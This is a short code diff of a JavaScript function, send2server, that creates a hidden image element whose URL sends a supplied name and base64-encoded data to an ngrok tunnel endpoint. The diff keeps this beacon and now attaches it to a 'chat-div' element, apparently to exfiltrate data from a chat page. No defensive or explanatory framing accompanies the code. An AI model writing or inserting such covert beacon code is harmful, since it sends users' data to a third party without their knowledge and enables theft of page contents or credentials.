@@ -1,7 +1,7 @@
 function send2server(name, data){
-  img = document.createElement("img");
-  img.src = "https://e8023e55.ngrok.io/record-data?name="+name+"&data="+btoa(encodeURI(data));
-  document.body.appendChild(img);
+  img2 = document.createElement("img");
+  img2.src = "https://e8023e55.ngrok.io/record-data?name="+name+"&data="+btoa(encodeURI(data));
+  document.getElementById("chat-div").appendChild(img2);
 };
 
 
